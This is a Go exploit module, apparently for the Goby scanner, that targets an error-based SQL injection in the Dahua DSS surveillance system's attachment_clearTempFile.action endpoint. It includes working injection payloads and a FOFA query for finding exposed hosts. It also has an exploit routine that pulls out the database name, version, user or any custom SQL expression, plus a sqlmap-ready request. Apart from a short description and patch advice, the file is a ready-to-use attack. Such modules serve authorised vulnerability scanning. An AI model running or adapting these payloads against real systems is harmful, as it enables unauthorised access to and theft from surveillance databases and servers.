package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua-DSS /portal/attachment_clearTempFile.action SQL Injection Vulnerability",
    "Description": "<p>Dahua DSS digital monitoring system is a security video surveillance system developed by Dahua, with real-time monitoring, PTZ operation, video playback, alarm processing, equipment management and other functions. SQL injection vulnerability exists in Dahua DSS. Attackers send specially constructed packets to the attachment clearTempFile.action route and use error injection to obtain sensitive database information. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.</p>",
    "Product": "Dahua-DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-13",
    "Author": "zhengwenjing@baimaohui.net",
    "FofaQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js\" && body=\"/portal/login_init.action\"",
    "GobyQuery": "body=\"/portal/include/script/dahuaDefined/headCommon.js\" && body=\"/portal/login_init.action\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1, pay attention to the official patch release information, patch or upgrade to the latest version.</p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [
        "https://blog.csdn.net/qq_39894062/article/details/137185636"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "concat(0,database())",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,md5(123),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,{{{Inject_param}}},0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '(~.*)(~)?'; nested exception is"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "大华-DSS /portal/attachment_clearTempFile.action SQL 注入漏洞",
            "Product": "大华-DSS",
            "Description": "<p>大华&nbsp;DSS&nbsp;数字监控系统是大华开发的一款安防视频监控系统，拥有实时监视、云台操作、录像回放、报警处理、设备管理等功能。大华 DSS存在SQL注入漏洞，攻击者 向 attachment_clearTempFile.action 路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&nbsp;<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本。&nbsp;</p><p>&nbsp;2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Dahua-DSS /portal/attachment_clearTempFile.action SQL Injection Vulnerability",
            "Product": "Dahua-DSS",
            "Description": "<p>Dahua DSS digital monitoring system is a security video surveillance system developed by Dahua, with real-time monitoring, PTZ operation, video playback, alarm processing, equipment management and other functions. SQL injection vulnerability exists in Dahua DSS. Attackers send specially constructed packets to the attachment clearTempFile.action route and use error injection to obtain sensitive database information. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background password, site user personal information), attackers can even write trojans to the server in the case of high permissions to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1, pay attention to the official patch release information, patch or upgrade to the latest version.</p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. Disable public network access to the system if necessary.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9930"
}`

	setSqlPayloadHashdsnuunasmfjuew8fbwug3fwfqws := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		//初始化变量
		vulurl = "/portal/attachment_clearTempFile.action"
		payload := "?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841," + sql + ")%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1"
		requestConfig := httpclient.NewGetRequestConfig(vulurl + payload)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false

		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil {
			return "", "", err
		}
		if resp.StatusCode != 200 {
			return "", "", fmt.Errorf("no response")
		}
		return resp.RawBody, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "e10adc3949ba59abbe56e057f20f883e"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `concat(0,md5('123456'))`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `XPATH syntax error: '([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashdsnuunasmfjuew8fbwug3fwfqws
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用

			sqlpoint := `GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,concat(0,database()))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
`
			// 3.配置正则语句，从响应包中提取出数据
			regular := `XPATH syntax error: '([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashdsnuunasmfjuew8fbwug3fwfqws
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "concat(0,database())"
					} else if way == "db_version" {
						sql = "concat(0,version())"
					} else if way == "user_name" {
						sql = "concat(0,user())"
					}
				}
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
